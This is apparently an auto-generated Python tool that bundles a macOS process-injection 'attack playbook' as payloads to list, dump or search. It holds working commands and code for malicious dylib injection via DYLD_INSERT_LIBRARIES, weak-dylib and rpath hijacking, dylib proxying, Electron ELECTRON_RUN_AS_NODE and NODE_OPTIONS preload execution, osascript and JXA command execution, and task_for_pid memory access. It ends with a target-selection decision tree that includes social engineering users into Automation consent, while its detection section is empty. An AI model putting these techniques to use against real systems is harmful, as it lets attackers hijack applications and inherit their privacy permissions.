#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/macos-process-injection

Skill: SKILL: macOS Process Injection — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-macos-process-injection.py --help
      python hack-skills-macos-process-injection.py --list
      python hack-skills-macos-process-injection.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/macos-process-injection'
TITLE = 'SKILL: macOS Process Injection — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: macos-process-injection", "description: >-", "macOS process injection playbook. Use when you need to inject code into running or launching macOS processes via dylib hijacking, DYLD environment variables, XPC exploitation, Mach port manipulation, or Electron/Chromium abuse."],
    'skill-macos-process-injection-expert-attack-playbook': [],
    '0-related-routing': ["Before going deep, consider loading:", "- [macos-security-bypass](../macos-security-bypass/SKILL.md) when you need to bypass TCC, Gatekeeper, or SIP protections blocking your injection", "- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) for Unix-layer escalation (shared object hijacking concepts apply)"],
    'advanced-reference': ["Also load [DYLIB_XPC_TECHNIQUES.md](./DYLIB_XPC_TECHNIQUES.md) when you need:", "- Step-by-step dylib hijacking methodology with tooling commands", "- XPC exploitation walkthrough with code examples", "- Mach port technique details and task_for_pid patterns"],
    '1-dyld-insert-libraries-injection': ["The most straightforward injection: set an environment variable that forces the dynamic linker to preload your dylib."],
    '1-1-requirements-and-restrictions': [],
    '1-2-basic-injection': ["```bash"],
    'create-malicious-dylib': ["cat > inject.c << 'EOF'", "__attribute__((constructor))", "void inject() {", "printf(\"[+] Injected into PID %d\\n\", getpid());", "// payload here"],
    'compile-for-both-architectures': ["gcc -dynamiclib -o inject.dylib inject.c -arch x86_64 -arch arm64"],
    'inject-into-target': ["DYLD_INSERT_LIBRARIES=./inject.dylib /path/to/target"],
    '1-3-finding-injectable-targets': ["```bash"],
    'find-apps-without-hardened-runtime': ["find /Applications -name \"*.app\" -exec sh -c '", "binary=$(defaults read \"$1/Contents/Info.plist\" CFBundleExecutable 2>/dev/null)", "if [ -n \"$binary\" ]; then", "flags=$(codesign -d --verbose \"$1/Contents/MacOS/$binary\" 2>&1)", "echo \"$flags\" | grep -q \"runtime\" || echo \"No Hardened Runtime: $1\"", "' _ {} \\;"],
    'find-apps-with-dyld-env-var-entitlement': ["find /Applications -name \"*.app\" -exec sh -c '", "binary=\"$1/Contents/MacOS/\"$(defaults read \"$1/Contents/Info.plist\" CFBundleExecutable 2>/dev/null)", "codesign -d --entitlements :- \"$binary\" 2>/dev/null | \\", "grep -q \"allow-dyld-environment-variables\" && echo \"DYLD injectable: $1\"", "' _ {} \\;"],
    '2-dylib-hijacking': ["Exploit the dynamic linker's library search order to load attacker-controlled dylibs instead of (or in addition to) legitimate ones."],
    '2-1-weak-dylib-hijacking-lc-load-weak-dylib': ["Weak dylibs are optional \u2014 if missing, the binary still runs. If you can place a dylib at the expected path, it loads.", "```bash"],
    'find-binaries-with-weak-dylib-references': ["otool -l /path/to/binary | grep -A 2 LC_LOAD_WEAK_DYLIB"],
    'check-if-the-weak-dylib-actually-exists': ["otool -L /path/to/binary | grep weak | while read lib rest; do", "[ ! -f \"$lib\" ] && echo \"MISSING (hijackable): $lib\""],
    '2-2-rpath-hijacking': ["`@rpath` is resolved from `LC_RPATH` entries in the binary. If an earlier rpath directory is writable, you can place your dylib there.", "```bash"],
    'list-rpath-entries': ["otool -l /path/to/binary | grep -A 2 LC_RPATH"],
    'list-rpath-relative-dylib-references': ["otool -L /path/to/binary | grep @rpath"],
    'if-rpath-includes-writable-directory-e-g-app-s-frameworks': [],
    'place-malicious-dylib-with-matching-name-there': [],
    '2-3-dylib-proxying': ["Replace a legitimate dylib with a malicious one that forwards all exports to the original.", "```bash"],
    'step-1-identify-target-dylib-and-its-exports': ["nm -gU /path/to/original.dylib | awk '{print $3}'"],
    'step-2-create-proxy-dylib-that-re-exports-everything': [],
    'move-original-to-original-real-dylib': [],
    'create-proxy': ["cat > proxy.c << 'EOF'", "__attribute__((constructor))", "void payload() {", "// malicious code here", "gcc -dynamiclib -o hijacked.dylib proxy.c \\", "-Wl,-reexport_library,/path/to/original_real.dylib \\", "-arch x86_64 -arch arm64"],
    '2-4-dependency-enumeration': ["```bash", "otool -L /path/to/binary              # List all dylib dependencies", "otool -l /path/to/binary              # Full load commands (rpaths, weak, etc.)", "dyldinfo -print_dependencies /path/to/binary  # Detailed dependency info (pre-Ventura)"],
    '3-xpc-exploitation': ["XPC (Cross-Process Communication) is macOS's primary IPC mechanism for privilege separation. Privileged XPC services are high-value targets."],
    '3-1-xpc-service-discovery': ["```bash"],
    'system-xpc-services': ["find /System/Library -name \"*.xpc\" -type d 2>/dev/null | head -20"],
    'third-party-xpc-services': ["find /Library /Applications -name \"*.xpc\" -type d 2>/dev/null"],
    'launchdaemon-xpc-services-root-level': ["grep -r \"MachServices\" /Library/LaunchDaemons/*.plist 2>/dev/null", "grep -r \"MachServices\" /System/Library/LaunchDaemons/*.plist 2>/dev/null"],
    '3-2-pid-reuse-attack': ["XPC connections validated by PID are vulnerable to race conditions: attacker spawns process, PID is checked and passes, attacker's process exits, OS reuses PID for malicious process.", "Timeline of PID reuse attack:", "1. Legitimate client (PID 1234) connects to XPC service", "2. XPC service checks PID 1234 \u2192 valid", "3. Legitimate client exits (PID 1234 freed)", "4. Attacker rapidly forks to get PID 1234", "5. Attacker's process (now PID 1234) sends malicious XPC message", "6. XPC service trusts PID 1234 (cached validation)"],
    '3-3-xpc-client-validation-weaknesses': [],
    '4-mach-port-manipulation': ["Mach ports are the kernel-level IPC primitive underlying XPC. Direct Mach port access enables powerful injection."],
    '4-1-task-port-task-for-pid': ["// Requires root or taskgated entitlement", "mach_port_t task;", "kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);", "if (kr == KERN_SUCCESS) {", "// Can now read/write target process memory", "// Can inject threads via thread_create_running"],
    '4-2-port-namespace-manipulation': [],
    '5-mig-mach-interface-generator-abuse': ["MIG generates C stubs for Mach IPC. MIG servers may have vulnerabilities in their dispatch routines."],
    '5-1-analysis-approach': ["```bash"],
    'find-mig-subsystems-in-a-binary': ["nm /path/to/binary | grep _subsystem", "strings /path/to/binary | grep \"MIG\""],
    'identify-mig-routine-dispatch-tables': ["otool -tV /path/to/binary | grep -A 5 \"server_routine\""],
    '5-2-common-mig-vulnerabilities': [],
    '6-electron-chromium-injection': ["Many macOS apps use Electron (Slack, Discord, VS Code, Teams, etc.). Electron apps expose multiple injection surfaces."],
    '6-1-electron-run-as-node': ["```bash"],
    'turns-electron-app-into-a-plain-node-js-runtime': ["ELECTRON_RUN_AS_NODE=1 \"/Applications/Slack.app/Contents/MacOS/Slack\" -e \\", "\"require('child_process').execSync('id').toString()\""],
    'this-inherits-the-app-s-tcc-permissions': [],
    'if-slack-has-camera-mic-screen-recording-your-code-gets-it-too': [],
    '6-2-debugging-flags': ["```bash"],
    'open-chrome-devtools-protocol-on-the-app': ["\"/Applications/Target.app/Contents/MacOS/Target\" --inspect=9229"],
    'then-connect-chrome-inspect-in-chrome-browser': [],
    'break-before-any-code-runs': ["\"/Applications/Target.app/Contents/MacOS/Target\" --inspect-brk=9229"],
    '6-3-node-options-injection': ["```bash"],
    'inject-preload-script-via-node-options': ["echo 'require(\"child_process\").execSync(\"id > /tmp/pwned\")' > /tmp/preload.js", "NODE_OPTIONS=\"--require /tmp/preload.js\" \"/Applications/Target.app/Contents/MacOS/Target\""],
    '6-4-electron-fuses': ["Modern Electron apps use \"fuses\" to disable dangerous features. Check fuse state:", "```bash"],
    'check-electron-fuse-status-requires-npx-electron-fuses': ["npx @electron/fuses read --app \"/Applications/Target.app\""],
    '7-application-scripting-apple-events': ["```bash"],
    'inject-via-osascript-if-automation-permission-exists': ["osascript -e 'tell application \"Terminal\" to do script \"id > /tmp/pwned\"'"],
    'javascript-for-automation-jxa': ["osascript -l JavaScript -e '", "var app = Application(\"Terminal\");", "app.doScript(\"id > /tmp/pwned\");"],
    'jxa-with-objc-bridge-powerful': ["osascript -l JavaScript -e '", "ObjC.import(\"Cocoa\");", "var task = $.NSTask.alloc.init;", "task.launchPath = \"/bin/bash\";", "task.arguments = [\"-c\", \"id > /tmp/pwned\"];", "task.launch;"],
    '8-process-injection-decision-tree': ["Need to inject code into macOS process", "\u251c\u2500\u2500 Target uses Electron?", "\u2502   \u251c\u2500\u2500 Fuses disabled? \u2192 ELECTRON_RUN_AS_NODE (\u00a76.1)", "\u2502   \u251c\u2500\u2500 Debugging available? \u2192 --inspect flag (\u00a76.2)", "\u2502   \u251c\u2500\u2500 NODE_OPTIONS not stripped? \u2192 preload injection (\u00a76.3)", "\u2502   \u2514\u2500\u2500 All fuses on? \u2192 check dylib path or XPC", "\u251c\u2500\u2500 Target has dylib env var entitlement?", "\u2502   \u2514\u2500\u2500 Yes \u2192 DYLD_INSERT_LIBRARIES (\u00a71)", "\u251c\u2500\u2500 Target has missing or weak dylib?", "\u2502   \u251c\u2500\u2500 LC_LOAD_WEAK_DYLIB with missing lib? \u2192 place dylib (\u00a72.1)", "\u2502   \u251c\u2500\u2500 @rpath with writable dir first in search? \u2192 rpath hijack (\u00a72.2)", "\u2502   \u2514\u2500\u2500 Existing dylib in writable location? \u2192 dylib proxy (\u00a72.3)", "\u251c\u2500\u2500 Target exposes XPC service?", "\u2502   \u251c\u2500\u2500 No client validation? \u2192 connect directly (\u00a73.3)", "\u2502   \u251c\u2500\u2500 PID-only validation? \u2192 PID reuse attack (\u00a73.2)", "\u2502   \u2514\u2500\u2500 Audit token validation? \u2192 need different vector", "\u251c\u2500\u2500 Have root access?", "\u2502   \u251c\u2500\u2500 Target not SIP-protected? \u2192 task_for_pid injection (\u00a74.1)", "\u2502   \u2514\u2500\u2500 SIP-protected? \u2192 need SIP bypass first (\u2192 macos-security-bypass)", "\u251c\u2500\u2500 Can use Apple Events?", "\u2502   \u251c\u2500\u2500 Automation permission for target? \u2192 osascript injection (\u00a77)", "\u2502   \u2514\u2500\u2500 No permission? \u2192 social engineer Automation consent", "\u2514\u2500\u2500 None of the above?", "\u251c\u2500\u2500 Check for MIG server vulnerabilities (\u00a75)", "\u2514\u2500\u2500 Look for bootstrap server name collision (\u00a74.2)"],
    '9-detection-forensics': [],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()